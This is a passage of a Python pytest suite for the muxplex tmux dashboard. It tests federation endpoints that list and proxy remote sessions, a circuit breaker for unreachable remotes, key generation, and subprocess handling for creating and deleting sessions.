    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    # The successful remote session (spark-2, index 0) must have remoteId == 0
    remote_entries = [s for s in data if s.get("remoteId") is not None]
    assert len(remote_entries) == 2, (
        f"Expected 2 remote entries (1 session + 1 unreachable), got: {remote_entries}"
    )

    spark2_session = next(
        (s for s in remote_entries if s.get("deviceName") == "spark-2"), None
    )
    assert spark2_session is not None, "Expected a session entry from spark-2"
    assert spark2_session["remoteId"] == "0", (
        f"remoteId for first remote (no device_id, index 0) must be string '0', "
        f"got: {spark2_session['remoteId']!r}"
    )
    assert isinstance(spark2_session["remoteId"], str), (
        f"remoteId must be a str, got {type(spark2_session['remoteId'])}"
    )

    # The unreachable remote (spark-3, index 1) must have remoteId == '1'
    spark3_entry = next(
        (s for s in remote_entries if s.get("deviceName") == "spark-3"), None
    )
    assert spark3_entry is not None, "Expected a status entry from spark-3"
    assert spark3_entry["remoteId"] == "1", (
        f"remoteId for second remote (no device_id, index 1) must be string '1', "
        f"got: {spark3_entry['remoteId']!r}"
    )


def test_federation_sessions_local_sessions_have_session_key(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/sessions: local sessions must have sessionKey = 'deviceId:name'.

    Local sessions are tagged with sessionKey = f'{local_device_id}:{name}' so they
    can be uniquely identified in the merged multi-device session list.
    """
    import json

    import muxplex.identity as identity_mod
    import muxplex.settings as settings_mod

    # Redirect identity file to a known UUID
    identity_path = tmp_path / "identity.json"
    identity_path.write_text(json.dumps({"device_id": "test-local-id"}))
    monkeypatch.setattr(identity_mod, "IDENTITY_PATH", identity_path)

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Write settings with no remote instances
    settings_path.write_text(
        json.dumps({"device_name": "my-local-machine", "remote_instances": []})
    )

    # Mock local session data
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha", "beta"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"alpha": "", "beta": ""})

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    # Find local sessions (remoteId=None)
    local_sessions = [s for s in data if s.get("remoteId") is None]
    assert len(local_sessions) == 2, f"Expected 2 local sessions, got: {local_sessions}"

    for local in local_sessions:
        assert "sessionKey" in local, (
            f"Local session must have sessionKey field, but got: {local}"
        )
        expected_key = f"test-local-id:{local['name']}"
        assert local["sessionKey"] == expected_key, (
            f"Local sessionKey must be '{expected_key}', got: {local['sessionKey']!r}"
        )


def test_federation_sessions_remote_sessions_have_session_key(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/sessions: remote sessions must have sessionKey = 'remoteId:name'.

    The sessionKey format is '{remote_id}:{session_name}' to prevent collisions
    between local and remote sessions with identical names.
    """
    import json
    from unittest.mock import MagicMock

    import httpx  # noqa: F401

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # One remote instance
    settings_path.write_text(
        json.dumps(
            {
                "device_name": "local-host",
                "remote_instances": [
                    {
                        "url": "http://spark-2:8088",
                        "key": "abc123",
                        "name": "spark-2",
                    }
                ],
            }
        )
    )

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    # Remote returns two sessions
    async def mock_get(url, **kwargs):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = lambda: None
        mock_resp.json = lambda: [
            {"name": "work", "snapshot": "", "bell": {}},
            {"name": "dev", "snapshot": "", "bell": {}},
        ]
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    # Find remote sessions (remoteId is not None) that are named sessions (not status entries)
    named_remote_sessions = [
        s for s in data if s.get("remoteId") is not None and "name" in s
    ]
    assert len(named_remote_sessions) == 2, (
        f"Expected 2 named remote sessions, got: {named_remote_sessions}"
    )

    for session in named_remote_sessions:
        assert "sessionKey" in session, (
            f"Remote session must have sessionKey field, but got: {session}"
        )
        expected_key = f"{session['remoteId']}:{session['name']}"
        assert session["sessionKey"] == expected_key, (
            f"sessionKey must be 'remoteId:name' = {expected_key!r}, "
            f"got: {session['sessionKey']!r}"
        )

    # Verify specific values
    work_session = next(s for s in named_remote_sessions if s["name"] == "work")
    assert work_session["sessionKey"] == "0:work", (
        f"Expected sessionKey '0:work', got: {work_session['sessionKey']!r}"
    )

    dev_session = next(s for s in named_remote_sessions if s["name"] == "dev")
    assert dev_session["sessionKey"] == "0:dev", (
        f"Expected sessionKey '0:dev', got: {dev_session['sessionKey']!r}"
    )


def test_federation_sessions_includes_remote_failure_status(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/sessions includes a status entry for unreachable remotes.

    When a remote instance cannot be reached (connection error), the result must
    include a status entry with status='unreachable' for that remote.
    """
    import json

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Configure one remote instance that will fail
    settings_path.write_text(
        json.dumps(
            {
                "device_name": "local-host",
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "abc123",
                        "name": "remote-host",
                        "id": "remote-1",
                    }
                ],
            }
        )
    )

    # Mock local sessions (empty for simplicity)
    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    # Patch the federation_client to raise a ConnectError (unreachable)
    from unittest.mock import MagicMock

    async def mock_get(url, **kwargs):
        raise httpx.ConnectError("Connection refused")

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    # Must return a list
    assert isinstance(data, list)

    # Find the failure status entry for the remote
    failure_entries = [
        s for s in data if s.get("status") in ("unreachable", "auth_failed")
    ]
    assert len(failure_entries) == 1, (
        f"Expected 1 failure status entry, got: {failure_entries}. Full data: {data}"
    )
    entry = failure_entries[0]
    assert entry["status"] == "unreachable"
    assert (
        entry.get("remoteId") == "0"
    )  # device_id string (fallback to str(index) when no device_id)


# ---------------------------------------------------------------------------
# Federation circuit breaker (dead remote must not lag every fan-out)
# ---------------------------------------------------------------------------


def _write_single_remote_settings(settings_path, url="http://dead-host:9"):
    import json

    settings_path.write_text(
        json.dumps(
            {
                "device_name": "local-host",
                "remote_instances": [
                    {"url": url, "key": "abc123", "name": "dead-host"}
                ],
            }
        )
    )


def test_federation_circuit_breaker_skips_dead_remote_after_threshold(
    client, monkeypatch, tmp_path, caplog
):
    """After 3 consecutive connection failures (the grace window) the dead
    remote is SKIPPED: no network call is made, the honest 'unreachable' entry
    is still returned, and the circuit-open transition is logged exactly once."""
    import logging

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    _write_single_remote_settings(settings_path)

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    from unittest.mock import MagicMock

    # Count only /api/sessions attempts -- the breaker gates the SESSIONS poll.
    # fetch_remote also makes a concurrent, independent /api/instance-info
    # probe (for deviceVersion) that this test isn't about; it fails the same
    # way (ConnectError) and is swallowed by _fetch_remote_version regardless.
    call_count = 0

    async def mock_get(url, **kwargs):
        nonlocal call_count
        if url.endswith("/api/sessions"):
            call_count += 1
        raise httpx.ConnectError("Connection refused")

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    with caplog.at_level(logging.WARNING, logger="muxplex.main"):
        # Requests 1-3: real attempts (failures count toward the breaker;
        # threshold matches the _FEDERATION_GRACE_FAILURES window of 3)
        for _ in range(3):
            response = client.get("/api/federation/sessions")
            assert response.status_code == 200
        assert call_count == 3

        # Requests 4-6: circuit open — NO further network calls
        for _ in range(3):
            response = client.get("/api/federation/sessions")
            assert response.status_code == 200
            data = response.json()
            entries = [s for s in data if s.get("status") == "unreachable"]
            assert len(entries) == 1, (
                f"Circuit-open remote must still appear as unreachable, got: {data}"
            )
        assert call_count == 3, (
            f"Open circuit must skip the network call entirely, "
            f"but the client was called {call_count} times"
        )

    open_logs = [r for r in caplog.records if "unreachable; skipping" in r.getMessage()]
    assert len(open_logs) == 1, (
        f"Circuit-open must be logged exactly once (no per-poll spam), "
        f"got {len(open_logs)}: {[r.getMessage() for r in open_logs]}"
    )


def test_federation_reachable_error_remote_is_never_circuit_broken(
    client, monkeypatch, tmp_path
):
    """A remote that RESPONDS with an auth error is reachable: it must keep
    being polled (no circuit break) and keep reporting its honest auth_failed
    status on every request."""
    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    _write_single_remote_settings(settings_path, url="http://badkey-host:8088")

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    from unittest.mock import MagicMock

    # Count only /api/sessions attempts -- see the sibling breaker test above
    # for why the concurrent /api/instance-info version probe isn't counted.
    call_count = 0

    async def mock_get(url, **kwargs):
        nonlocal call_count
        if url.endswith("/api/sessions"):
            call_count += 1
        mock_resp = MagicMock()
        mock_resp.status_code = 401
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    for i in range(4):
        response = client.get("/api/federation/sessions")
        assert response.status_code == 200
        data = response.json()
        entries = [s for s in data if s.get("status") == "auth_failed"]
        assert len(entries) == 1, (
            f"Request {i + 1}: reachable-but-erroring remote must still be "
            f"reported as auth_failed, got: {data}"
        )
    assert call_count == 4, (
        f"Reachable remote must be polled on every request (never circuit-broken), "
        f"expected 4 calls, got {call_count}"
    )


def test_federation_circuit_breaker_recovers_after_cooldown(
    client, monkeypatch, tmp_path
):
    """End-to-end recovery: circuit opens on a dead remote, then after the
    cooldown a half-open probe succeeds and the remote's sessions reappear."""
    import httpx

    import muxplex.main as main_mod
    import muxplex.settings as settings_mod
    from muxplex.breaker import CircuitBreaker

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    _write_single_remote_settings(settings_path, url="http://flaky-host:8088")

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    # Deterministic clock so the test doesn't sleep through a real cooldown
    fake_now = [1000.0]
    breaker = CircuitBreaker(threshold=2, cooldown=60.0, clock=lambda: fake_now[0])
    monkeypatch.setattr(main_mod, "_federation_breaker", breaker)

    from unittest.mock import MagicMock

    remote_up = [False]

    async def mock_get(url, **kwargs):
        if not remote_up[0]:
            raise httpx.ConnectError("Connection refused")
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = lambda: None
        mock_resp.json = lambda: [{"name": "revived", "snapshot": "", "bell": {}}]
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    # Open the circuit
    client.get("/api/federation/sessions")
    client.get("/api/federation/sessions")
    assert breaker.is_open("http://flaky-host:8088")

    # Remote comes back up; cooldown elapses; half-open probe succeeds
    remote_up[0] = True
    fake_now[0] += 61.0
    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()
    names = [s.get("name") for s in data]
    assert "revived" in names, (
        f"After recovery the remote's sessions must reappear, got: {data}"
    )
    assert not breaker.is_open("http://flaky-host:8088"), (
        "Successful half-open probe must close the circuit"
    )


# ---------------------------------------------------------------------------
# POST /api/federation/{remote_id}/connect/{session_name} (task-12)
# ---------------------------------------------------------------------------


def test_federation_connect_proxies_to_remote(client, monkeypatch, tmp_path):
    """POST /api/federation/{remote_id}/connect/{session_name} proxies POST to remote's connect endpoint.

    Looks up remote by integer index, sends POST {remote_url}/api/sessions/{session_name}/connect
    with Bearer auth header, and returns the remote's JSON response.
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "id": "remote-0",
                    }
                ],
            }
        )
    )

    # Track what POST was called with
    post_calls = []

    async def mock_post(url, **kwargs):
        post_calls.append({"url": url, "kwargs": kwargs})
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "active_session": "my-session",
            "ttyd_port": 7682,
        }
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.post = mock_post
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.post("/api/federation/0/connect/my-session")
    assert response.status_code == 200

    # Verify the POST was made to the correct URL with session name
    assert len(post_calls) == 1, f"Expected exactly 1 POST call, got {len(post_calls)}"
    call = post_calls[0]
    assert call["url"] == "http://remote-host:8088/api/sessions/my-session/connect", (
        f"Expected POST to remote connect URL, got: {call['url']}"
    )

    # Verify Bearer auth was included
    headers = call["kwargs"].get("headers", {})
    assert headers.get("Authorization") == "Bearer secret-key-123", (
        f"Expected Bearer auth header, got: {headers}"
    )

    # Verify the response is the remote's JSON
    data = response.json()
    assert data["active_session"] == "my-session"
    assert data["ttyd_port"] == 7682


def test_federation_connect_returns_404_for_invalid_remote_id(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{remote_id}/connect/{session_name} returns 404 when remote_id is out of range."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # No remote instances configured
    settings_path.write_text(json.dumps({"remote_instances": []}))

    response = client.post("/api/federation/0/connect/my-session")
    assert response.status_code == 404


def test_federation_connect_returns_404_for_non_integer_remote_id(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{device_id}/connect/{session_name} returns 404 when device_id has no match.

    With device_id typed as str, any string is a valid path parameter.
    When no remote matches 'not-an-int' by device_id and it cannot be parsed
    as an integer index, the lookup returns None and the endpoint returns 404.
    """
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"remote_instances": []}))

    response = client.post("/api/federation/not-an-int/connect/my-session")
    assert response.status_code == 404  # device_id not found in remote_instances


def test_federation_connect_returns_503_when_remote_unreachable(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{remote_id}/connect/{session_name} returns 503 when remote is unreachable.

    If the outbound http_client.post() raises a network-level exception (e.g. ConnectError),
    the endpoint must return 503 rather than propagating a raw 500.
    """
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "id": "remote-0",
                    }
                ],
            }
        )
    )

    async def mock_post_unreachable(*args, **kwargs):
        raise httpx.ConnectError("Connection refused")

    mock_fed_client = MagicMock()
    mock_fed_client.post = mock_post_unreachable
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.post("/api/federation/0/connect/my-session")
    assert response.status_code == 503


def test_federation_connect_returns_502_when_remote_returns_error_status(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{remote_id}/connect/{session_name} returns 502 when remote returns HTTP error.

    If the outbound http_client.post() returns a non-2xx response that raises HTTPStatusError
    (via raise_for_status), the endpoint must return 502 with the upstream status code in the detail.
    """
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "id": "remote-0",
                    }
                ],
            }
        )
    )

    async def mock_post_error(*args, **kwargs):
        mock_response = MagicMock(spec=httpx.Response)
        mock_response.status_code = 502
        raise httpx.HTTPStatusError(
            "Bad Gateway",
            request=MagicMock(),
            response=mock_response,
        )

    mock_fed_client = MagicMock()
    mock_fed_client.post = mock_post_error
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.post("/api/federation/0/connect/my-session")
    assert response.status_code == 502


def test_federation_connect_returns_404_for_negative_remote_id(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{remote_id}/connect/{session_name} returns 404 for negative remote_id.

    Negative indices are valid Python list indices ("from the end"), so without an
    explicit guard a value like -1 would silently proxy to the last configured remote
    instead of returning 404.  The endpoint must treat negatives as out-of-range.
    """
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # One remote configured — without the guard, remote_id=-1 would return it
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "id": "remote-0",
                    }
                ],
            }
        )
    )

    response = client.post("/api/federation/-1/connect/my-session")
    assert response.status_code == 404


# ---------------------------------------------------------------------------
# GET /api/federation/{device_id}/sessions/{session_name} -- remote session
# details/scrollback proxy (the read-side counterpart to GET /api/sessions/{name})
# ---------------------------------------------------------------------------


def _write_one_remote(monkeypatch, tmp_path):
    """Shared setup: one remote instance configured, settings redirected to tmp_path."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "device_id": "dev1",
                    }
                ],
            }
        )
    )


def test_federation_session_details_proxies_to_remote(client, monkeypatch, tmp_path):
    """GET /api/federation/{device_id}/sessions/{name} proxies to the remote's
    GET /api/sessions/{name}, with Bearer auth and the `lines` query param,
    and tags the remote's response with deviceId/deviceName/remoteId."""
    from unittest.mock import MagicMock

    _write_one_remote(monkeypatch, tmp_path)

    get_calls = []

    async def mock_get(url, **kwargs):
        get_calls.append({"url": url, "kwargs": kwargs})
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "name": "setup-llm",
            "snapshot": "some pane text\n",
            "lines": 30,
            "last_activity_at": 123.0,
            "created_at": 100.0,
            "cwd": "/home/user/project",
            "followups": {"pending": 0},
        }
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/dev1/sessions/setup-llm")
    assert response.status_code == 200

    assert len(get_calls) == 1
    call = get_calls[0]
    assert call["url"] == "http://remote-host:8088/api/sessions/setup-llm"
    assert (
        call["kwargs"].get("headers", {}).get("Authorization")
        == "Bearer secret-key-123"
    )
    assert call["kwargs"].get("params", {}).get("lines") == 30  # DEFAULT_CAPTURE_LINES

    data = response.json()
    assert data["name"] == "setup-llm"
    assert data["snapshot"] == "some pane text\n"
    assert data["cwd"] == "/home/user/project"
    assert data["deviceId"] == "dev1"
    assert data["remoteId"] == "dev1"
    assert data["deviceName"] == "remote-host"


def test_federation_session_details_forwards_lines_and_before(
    client, monkeypatch, tmp_path
):
    """`lines` and `before` query params are forwarded to the remote's own
    GET /api/sessions/{name} call."""
    from unittest.mock import MagicMock

    _write_one_remote(monkeypatch, tmp_path)

    get_calls = []

    async def mock_get(url, **kwargs):
        get_calls.append({"url": url, "kwargs": kwargs})
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"name": "setup-llm", "snapshot": "x"}
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/dev1/sessions/setup-llm?lines=50&before=200")
    assert response.status_code == 200
    params = get_calls[0]["kwargs"].get("params", {})
    assert params.get("lines") == 50
    assert params.get("before") == 200


def test_federation_session_details_400_for_lines_out_of_range(
    client, monkeypatch, tmp_path
):
    """`lines` out of [1, MAX_CAPTURE_LINES] is a 400 -- validated locally,
    before any network call is made, exactly like GET /api/sessions/{name}."""
    from unittest.mock import MagicMock

    _write_one_remote(monkeypatch, tmp_path)

    mock_fed_client = MagicMock()
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/dev1/sessions/setup-llm?lines=5000")
    assert response.status_code == 400
    mock_fed_client.get.assert_not_called()


def test_federation_session_details_404_for_unknown_device(
    client, monkeypatch, tmp_path
):
    """Unknown device_id returns 404, same message shape as the other
    routes in the /api/federation/{device_id}/... family."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"remote_instances": []}))

    response = client.get("/api/federation/no-such-device/sessions/setup-llm")
    assert response.status_code == 404


def test_federation_session_details_404_when_session_missing_on_remote(
    client, monkeypatch, tmp_path
):
    """The remote is reachable but has no such session: an honest 404 (the
    remote's own not-found), NOT the 'unreachable' status shape."""
    from unittest.mock import MagicMock

    _write_one_remote(monkeypatch, tmp_path)

    async def mock_get(url, **kwargs):
        mock_resp = MagicMock()
        mock_resp.status_code = 404
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/dev1/sessions/no-such-session")
    assert response.status_code == 404
    assert "no-such-session" in response.json()["detail"]
    assert "remote-host" in response.json()["detail"]


def test_federation_session_details_auth_failed_status(client, monkeypatch, tmp_path):
    """A 401/403 from the remote surfaces as a 200 body with
    status='auth_failed' -- the same status vocabulary
    GET /api/federation/sessions' fetch_remote() uses, not an exception."""
    from unittest.mock import MagicMock

    _write_one_remote(monkeypatch, tmp_path)

    async def mock_get(url, **kwargs):
        mock_resp = MagicMock()
        mock_resp.status_code = 403
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/dev1/sessions/setup-llm")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "auth_failed"
    assert data["deviceId"] == "dev1"
    assert data["deviceName"] == "remote-host"
    assert data["name"] == "setup-llm"


def test_federation_session_details_unreachable_on_transport_error(
    client, monkeypatch, tmp_path
):
    """A connection-level failure (refused/timeout) surfaces as a 200 body
    with status='unreachable', not a 500/503 -- the whole point being that
    an agent tool (or any caller) never has to treat 'remote is down' as a
    fault. Also records the failure on the shared _federation_breaker."""
    from unittest.mock import MagicMock

    import httpx as httpx_mod

    import muxplex.main as main_mod

    _write_one_remote(monkeypatch, tmp_path)

    async def mock_get(url, **kwargs):
        raise httpx_mod.ConnectError("Connection refused")

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/dev1/sessions/setup-llm")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "unreachable"
    assert data["deviceId"] == "dev1"
    assert data["deviceName"] == "remote-host"
    assert data["name"] == "setup-llm"

    # Same shared breaker federation_sessions()/federation_devices() use --
    # one failure here counts toward it, keyed by the remote's URL.
    assert main_mod._federation_breaker.is_open("http://remote-host:8088") is False
    # (below threshold after a single failure -- see the open-circuit test)


def test_federation_session_details_skips_network_call_when_breaker_open(
    client, monkeypatch, tmp_path
):
    """When the shared circuit breaker already has this remote's URL open
    (e.g. from a prior GET /api/federation/sessions poll), this route must
    skip the network call entirely and return the unreachable shape --
    never pay a fresh timeout for a remote already known dead."""
    from unittest.mock import MagicMock

    import muxplex.main as main_mod

    _write_one_remote(monkeypatch, tmp_path)

    # Force the shared breaker open for this remote's URL.
    for _ in range(main_mod._FEDERATION_GRACE_FAILURES):
        main_mod._federation_breaker.record_failure("http://remote-host:8088")
    assert main_mod._federation_breaker.is_open("http://remote-host:8088") is True

    mock_fed_client = MagicMock()
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/dev1/sessions/setup-llm")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "unreachable"
    mock_fed_client.get.assert_not_called()


def test_federation_session_details_502_on_unexpected_remote_http_error(
    client, monkeypatch, tmp_path
):
    """A remote HTTP error other than 404/401/403 (e.g. 500) is an honest,
    reachable-but-erroring state -- wrapped as 502, matching the write
    proxies' (federation_connect etc.) convention for this case, and never
    counted against the circuit breaker (the remote IS reachable)."""
    from unittest.mock import MagicMock

    import httpx as httpx_mod

    import muxplex.main as main_mod

    _write_one_remote(monkeypatch, tmp_path)

    async def mock_get(url, **kwargs):
        mock_response = MagicMock(spec=httpx_mod.Response)
        mock_response.status_code = 500
        mock_resp = MagicMock()
        mock_resp.status_code = 500
        mock_resp.raise_for_status.side_effect = httpx_mod.HTTPStatusError(
            "Internal Server Error", request=MagicMock(), response=mock_response
        )
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.get("/api/federation/dev1/sessions/setup-llm")
    assert response.status_code == 502
    assert main_mod._federation_breaker.is_open("http://remote-host:8088") is False


# ---------------------------------------------------------------------------
# POST /api/federation/generate-key (task-13)
# ---------------------------------------------------------------------------


def test_federation_generate_key_creates_file(client, tmp_path, monkeypatch):
    """POST /api/federation/generate-key creates a key file and returns the key in the response.

    - Endpoint returns 200 with {"key": <str>, "path": <str>}
    - Returned key length > 20
    - The key file is created at the redirected FEDERATION_KEY_PATH
    - The file contents match the returned key (with trailing newline stripped)
    """
    import muxplex.settings as settings_mod

    key_path = tmp_path / "federation_key"
    monkeypatch.setattr(settings_mod, "FEDERATION_KEY_PATH", key_path)

    response = client.post("/api/federation/generate-key")
    assert response.status_code == 200, (
        f"Expected 200, got {response.status_code}: {response.text}"
    )

    data = response.json()
    assert "key" in data, f"Response must include 'key' field, got: {data}"
    assert "path" in data, f"Response must include 'path' field, got: {data}"

    returned_key = data["key"]
    assert len(returned_key) > 20, (
        f"Key must be longer than 20 chars, got length {len(returned_key)}"
    )

    # Verify file was created
    assert key_path.exists(), f"Key file must be created at {key_path}"

    # Verify file contents match returned key
    file_contents = key_path.read_text().strip()
    assert file_contents == returned_key, (
        f"File contents must match returned key. "
        f"File: {file_contents!r}, key: {returned_key!r}"
    )


def test_get_auth_token_returns_401_when_not_authenticated(monkeypatch):
    """GET /api/auth/token returns 401 when request has no valid session cookie."""
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    with TestClient(app, base_url="http://192.168.1.1") as c:
        # No cookie set — endpoint must return 401 with application/json accept
        response = c.get("/api/auth/token", headers={"Accept": "application/json"})
    assert response.status_code == 401


# ---------------------------------------------------------------------------
# Bug fix: delete_session must pass input="y\n" to subprocess.run
# ---------------------------------------------------------------------------


def test_delete_session_passes_stdin_y_to_subprocess(client, monkeypatch, tmp_path):
    """DELETE /api/sessions/{name} must pass input='y\\n' to subprocess.run.

    When delete_session_template uses an interactive command (e.g. amplifier-dev
    --destroy), the confirmation prompt must be auto-answered via stdin.
    Without input='y\\n', subprocess.run hangs until 30s timeout and the
    session is never actually deleted.
    """
    from unittest.mock import MagicMock, patch

    import muxplex.settings as settings_mod

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["my-session"])
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "no-settings.json")

    captured_kwargs = []

    def mock_run(cmd, **kwargs):
        captured_kwargs.append(kwargs)
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch("muxplex.main.subprocess.run", side_effect=mock_run):
        response = client.delete("/api/sessions/my-session")

    assert response.status_code == 200
    assert len(captured_kwargs) == 1, "subprocess.run must be called once"
    kwargs = captured_kwargs[0]
    assert "input" in kwargs, (
        "subprocess.run must receive input= kwarg to auto-answer interactive prompts"
    )
    assert kwargs["input"] == "y\n", (
        f"input must be 'y\\n' to confirm deletion, got: {kwargs['input']!r}"
    )


# ---------------------------------------------------------------------------
# Bug fix: create_session/delete_session must honor tmux_socket_dir (tmux_env())
# ---------------------------------------------------------------------------
#
# When muxplex runs as a systemd/launchd service, its process environment does
# NOT include TMUX_TMPDIR even if the user's interactive shell sets it (e.g. to
# keep tmux sockets out of the shared, world-writable /tmp). run_tmux() in
# sessions.py already compensates for this via tmux_env(). These two endpoints
# spawn user-configured command templates (which often invoke external tools
# like `amplifier-workspace` that call bare `tmux` themselves) and must pass the
# same env, or those subprocess-spawned tmux calls silently target the default
# socket (/tmp/tmux-$UID) instead of the configured tmux_socket_dir -- making
# newly created sessions invisible to muxplex, and deletes silent no-ops
# against the real running session.


def test_create_session_passes_tmux_env_to_subprocess(client, monkeypatch, tmp_path):
    """POST /api/sessions must pass tmux_env() as env= to create_subprocess_shell.

    Regression guard: without this, a custom tmux_socket_dir setting is
    silently ignored by whatever tmux calls the session command template makes,
    so sessions created via this endpoint can end up on a different tmux socket
    than the one muxplex itself reads from (enumerate_sessions/capture_pane).
    """
